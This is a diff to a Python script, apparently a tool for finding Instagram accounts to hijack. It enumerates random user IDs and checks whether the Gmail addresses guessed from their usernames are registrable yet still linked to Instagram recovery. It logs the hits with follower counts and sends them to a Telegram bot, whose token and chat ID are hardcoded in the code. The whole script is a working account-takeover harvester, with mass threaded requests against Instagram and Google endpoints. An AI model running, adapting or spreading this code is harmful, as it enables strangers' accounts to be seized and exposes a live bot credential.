@@ -1,9 +1,6 @@
 import requests
 import random
 import json, string
-import webbrowser
-
-import time
 from threading import Thread
 import os
 from user_agent import *
@@ -16,136 +13,38 @@ import hashlib
 import uuid
 from requests import get
 import sys
-from cfonts import render, say
-import time  
-print("◧" * 60)
-EHRA = render('{EHRA}', colors=['white', 'cyan'], align='center')
-print(EHRA)
-print ("\033[1;30m             тнє тσσℓ ιѕ ρяσgяαммє∂ ву @MYEHRA")
-print("◧" * 60)
-print('\r')
-print('𝖭𝖮𝖳𝖤 - 𝖣𝗈𝗇𝗍 𝖴𝗌𝖾 𝖨𝗍 𝖮𝗇 𝖶𝗂𝖥𝗂  𝖴𝗌𝖾 𝖸𝗈𝗎𝗋 𝖬𝗈𝖻𝗂𝗅𝖾 𝖣𝖺𝗍𝖺 For Best Results ✅ 𝖨𝖿 𝖸𝗈𝗎 𝖣𝗈𝗇𝗍 𝖦𝖾𝗍 𝖠𝗇𝗒 𝖧𝗂𝗍 𝖳𝗁𝖾𝗇 𝖳𝗎𝗋𝗇 𝖮𝗇 𝗈𝗋 𝖮𝖿𝖿 𝖠𝖾𝗋𝗈𝗉𝗅𝖺𝗇𝖾 𝖬𝗈𝖽𝖾')
-print('\033[1;36m')
-print("◧" * 60)
-print('')
-ID = input(f"\033[1;36m\033[1m𝗬𝗼𝘂𝗿 𝗜𝗗 : \033[0m ")
-print('')
-webbrowser.open('https://t.me/GODTEST')
-print("◧" * 60)
-token = input(f"\033[1;36m\033[1m𝗬𝗼𝘂𝗿 𝗧𝗼𝗸𝗲𝗻 : \033[0m ")
-print('')
-print("◧" * 60)
-bl = "\x1b[1;30m"
-red = "\033[1m\033[31m"
-green = "\033[1m\033[32m"
-yellow = "\033[1m\033[33m"
-blue = "\033[1m\033[34m"
-cyan = "\033[1m\033[36m"
-magenta = "\033[1m\033[35m"
-M = "\033[1m\033[36m"
-white = "\033[1m\033[37m"
-orange = "\033[1m\033[38;5;208m"
-reset = "\033[0m"
-print ('\x1b[1;36m')
-mj = 0
+from datetime import datetime   
+import webbrowser
+try:
+    from cfonts import render, say
+except:
+    os.system('pip install python-cfonts')
+   
+#--------------------------------------
+# colour 
+#──────────────
+c1 = '\x1b[38;5;120m'
+j21 = '\x1b[38;5;204m'
+p1 = '\x1b[38;5;150m'
+x = '\x1b[1;33m'
+z = '\x1b[1;31m'
+bi = random.randint(5,208)
+bos = f'\x1b[38;5;{bi}m'
+memo = random.randint(100, 300)
+ror = f'\x1b[38;5;{memo}m'
+#─────────────────── 
+token = "7470950297:AAE0XCjWqgqwUUYgUiYLAHaBzrtL5nYwyrc"
+print("") 
+ID = "6893463477"
+os.system('clear')
+
+total = 0
 hits = 0
-badinsta = 0
-bademail = 0
+bad_gm = 0
+bad_mail = 0
 goodig = 0
-
-def pppp():
-    os.system('clear')
-    output = (f"\x1b[1;36m▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦\n"
-              f"\x1b[1;30m ༄𝙃𝙄𝙏𝙎: \x1b[1;32m{hits}\n"
-              f"\x1b[1;30m༄𝘽𝘼𝘿 𝙄𝙂: \x1b[1;31m{badinsta}\n"
-              f"\x1b[1;30m༄𝗕𝗔𝗗 𝗠𝗔𝗜𝗟 : \x1b[1;32m{bademail}\n"
-              f"\x1b[1;30m𝙄𝙂: \x1b[1;36m{goodig}\n"
-              f"\x1b[1;36m ༄𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 : @MJEHRA              ▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦\n")
-    
-    sys.stdout.write(output)
-    sys.stdout.flush()
-
-
-os.system ('clear')
-print (EHRA)
-print("◧" * 60)
-a = print(f""" 
-         {red} 𝟏 {bl}➼ {M}𝟐𝟎𝟏𝟎-𝟏𝟏
-◧◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◨
-         {red} 𝟐 {bl}➼ {M}𝟐𝟎𝟏𝟐-𝟏𝟑 
-◧◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◨
-         {red} 𝟑 {bl}➼ {cyan}𝟐𝟎𝟏𝟒-𝟏𝟗
-◧◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◨
-         {red} 𝟒 {bl}➼ {cyan}𝟐𝟎𝟐𝟎-𝟐𝟑
-◧◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◨
-""")
-ehra = input(f" 𝘾𝙃𝙊𝙊𝙎𝙀 𝙊𝙋𝙏𝙄𝙊𝙉 ⋙ {reset}")
-
-if ehra == '1':
-    bbk = 1
-    id = 17699999
-elif ehra == '2':
-    bbk = 17699999
-    id = 361365133
-elif ehra == '3':
-    bbk = 1629010001
-    id = 21254029834
-elif ehra == '4':
-    bbk = 43464475395
-    id = 63313426938
-else:
-    exit()
-
-while True:
-    try:
-        res = requests.get('https://signup.live.com/signup')
-        amsc = res.cookies.get_dict().get('amsc')
-        canary = res.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
-        cookies = {
-            'amsc': amsc,
-        }
-        headers = {
-            'authority': 'signup.live.com',
-            'accept': 'application/json',
-            'canary': canary,
-            'origin': 'https://signup.live.com',
-            'referer': 'https://signup.live.com/signup?lic=1&uaid=f26d1e8726944e3f9cc96aafdfdf8225',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        }
-
-        json_data = {
-            'clientExperiments': [
-                {
-                    'parallax': 'enablejspublickeydeprecationexperiment',
-                    'control': 'enablejspublickeydeprecationexperiment_control',
-                    'treatments': [
-                        'enablejspublickeydeprecationexperiment_treatment',
-                    ],
-                },
-            ],
-        }
-
-        response = requests.post(
-            'https://signup.live.com/API/EvaluateExperimentAssignments',
-            cookies=cookies,
-            headers=headers,
-            json=json_data,
-        ).json()
-        canary = response['apiCanary']
-        break
-    except:
-        pass
-
-while True:
-    try:
-        a = "https://www.instagram.com/accounts/login"
-        session = requests.Session()
-        aa = session.get(a)
-        csrf = aa.cookies.get('csrftoken')
-        break
-    except:
-        pass
-
+infoinsta = {}
+import requests
 yy = 'azertyuiopmlkjhgfdsqwxcvbn'
 def tll():
     try:
@@ -197,7 +96,7 @@ def tll():
 tll()
 
 def check_gmail(email):
-    global bademail, hits
+    global bad_mail, hits
     try:
         if '@' in email:
             email = str(email).split('@')[0]
@@ -237,6 +136,7 @@ def check_gmail(email):
         )
         if '"gf.uar",1' in str(response.text):
             hits += 1
+            open("rnd.txt","a").write(f"/addx {email}@gmail.com : Random\n")
             pppp()
             if '@' not in email:
                 ok = email + '@gmail.com'
@@ -246,45 +146,12 @@ def check_gmail(email):
                 username, gg = email.split('@')
                 InfoAcc(username, gg)
         else: 
-          bademail+=1
+          bad_mail+=1
           pppp()
     except:''
 
-def hotmail(email):
-    global hits, bademail
-    cookies = {
-        'amsc': amsc,
-    }
-
-    headers = {
-        'canary': canary,
-        'origin': 'https://signup.live.com',
-        'referer': 'https://signup.live.com/signup?lic=1&uaid=3daaf5bf6b70499d8a5035844d5bbfd8',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    }
-
-    json_data = {
-        'signInName': email,
-    }
-
-    response = requests.post(
-        'https://signup.live.com/API/CheckAvailableSigninNames',
-        cookies=cookies,
-        headers=headers,
-        json=json_data,
-    ).text
-    
-    if '"isAvailable":true' in response:
-        hits += 1
-        pppp()
-        username, gg = email.split('@')
-        InfoAcc(username, gg)
-    else:
-        bademail += 1
-        pppp()
-        
 def check(email):
-    global goodig, badinsta
+    global goodig, bad_gm
     ua = generate_user_agent()
     dev = 'android-'
     device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
@@ -306,14 +173,12 @@ def check(email):
     }
     response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
     if email in response:
-        if '@hotmail.com' in email:
-            hotmail(email)
-        elif '@gmail.com' in email:
+        if '@gmail.com' in email:
             check_gmail(email)
         goodig += 1
         pppp()
     else:
-        badinsta += 1
+        bad_gm += 1
         pppp()
 
 
@@ -348,7 +213,7 @@ def rest(user):
     response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
     r=response['email']
   except:
-    r='CRACKED!'
+    r='bad'
   return r
 
 def date(hy):
@@ -363,83 +228,89 @@ def date(hy):
             (3713668786, 2016),
             (5699785217, 2017),
             (8597939245, 2018),
-            (21254029834, 2019),
-            (43464475396, 2020),
-            (50289297648, 2021),
-            (57464707083, 2022),
-            (63313426938, 2023)
+            (21254029834, 2019)
         ]
         
         for upper, year in ranges:
             if hy <= upper:
                 return year
-        return 2024
+        return 2023
     
     except Exception:
         pass
-
-    
+        
 def InfoAcc(username, gg):
-    global mj
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9',
-        'origin': 'https://storiesig.info',
-        'priority': 'u=1, i',
-        'referer': 'https://storiesig.info/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': str(generate_user_agent()),
-    }
+    global total
 
-    try:
-        rrr = requests.get(f'https://api-ig.storiesig.info/api/userInfoByUsername/{username}', headers=headers).json()
-    except Exception as e:
-        rrr = {}
+    rr= infoinsta.get(username,{})
 
-    Id = rrr.get('result', {}).get('user', {}).get('pk', 'none')
-    fows = rrr.get('result', {}).get('user', {}).get('follower_count', 'none')
-    fowg = rrr.get('result', {}).get('user', {}).get('following_count', 'none')
-    pp = rrr.get('result', {}).get('user', {}).get('media_count', 'none')
-
+    Id = rr.get('pk', None)
+    full_name = rr.get('full_name', None)
+    fows = rr.get('follower_count', None)
+    fowg = rr.get('following_count', None)
+    pp = rr.get('media_count', None)
+    isPraise = rr.get('is_private', None)
+    bio = rr.get('biography', None)
+    is_verified = rr.get('is_verified', None)
+    if (fows >= 100 and pp >= 10):
+      meta = True
+    else:
+      meta = False 
     try:
         hy = int(Id) if Id != 'none' else None
         datte = date(hy) if hy else 'none'
     except:
         datte = 'none'
 
-    mj += 1
-    tlg = f'''
-𝐄𝐇𝐑𝐀 𝐆𝐎𝐓 𝐇𝐈𝐓 𝐍𝐎. {mj}
-◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧
-𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {username}
-𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 : {fows}
-𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 : {fowg}
-𝗣𝗢𝗦𝗧𝗦 : {pp}
-𝗗𝗔𝗧𝗘 : {datte}
-𝗘𝗠𝗔𝗜𝗟 : {username}@{gg}
-𝗥𝗘𝗦𝗧 : {rest(username)}
-◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧◧ <a href="https://t.me/MYEHRA">༄𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑</a>
+    total += 1
+    ss = f'''
+─────────────────── 
+ 𝐇ιт - {total}
+ 𝐃σмαιη - {gg}
+ 𝐈∂ - {Id}
+ 𝐔ѕєяηαмє - @{username}
+ 𝐃αтє - {datte}
+ 𝐅ᴏʟʟᴏᴡᴇʀs - {fows}
+ 𝐅σʟʟᴏᴡɪɴɢ - {fowg}
+ 𝐏ᴏsᴛs - {pp}
+ 𝐄-мαιℓ - {username}@{gg}
+ 𝐑єѕт - {rest(username)}
+ 𝐔яℓ - https://www.instagram.com/{username}
+─────────────────── 
+By -> @DE4T8
 '''
-
-    with open('EHRA HITZ.txt', 'a') as ff:
-        ff.write(f'{tlg}\n')
+    with open('hitsss.txt', 'a') as kk:
+        kk.write(f'{ss}\n')
 
     try:
-        try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+        try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
+        
         except:pass
     except Exception as e:
         pass
+        
+def pppp():
+    bi = random.randint(5,208)
+    bos = f'\x1b[38;5;{bi}m'
+    memo = random.randint(100, 300)
+    ror = f'\x1b[38;5;{memo}m'
+    output = (f"""
+{bos}───────────────────              
+{c1}𝐇𝐢𝐭    -  {hits}
+{p1}𝐅𝐚𝐢𝐥    -  {bad_mail}
+{x}𝐆𝐨𝐨𝐝   -  {goodig}
+{z}𝐁𝐚𝐧𝐝   -  {bad_gm}   
+{ror}───────────────────              
+""") 
+
+    sys.stdout.write(output)
+    sys.stdout.flush()       
         
 def gg():
     while True:
         data = {
             "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
-            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
+            "variables": json.dumps({"id": int(random.randrange(17750000, 279760000)), "render_surface": "PROFILE"}),
             "doc_id": "25618261841150840"
         }
 
@@ -450,9 +321,11 @@ def gg():
         )
         try:
             username = response.json().get('data', {}).get('user', {}).get('username')
-            emails = [username + '@hotmail.com', username + '@gmail.com']
+            infoinsta[username] = response.json().get('data', {}).get('user', {})
+            emails = [username + '@gmail.com']
             for email in emails:
                 check(email)
         except:''
-for _ in range(50):
-    Thread(target=gg).start()    
+for _ in range(170):
+    Thread(target=gg).start()
+    
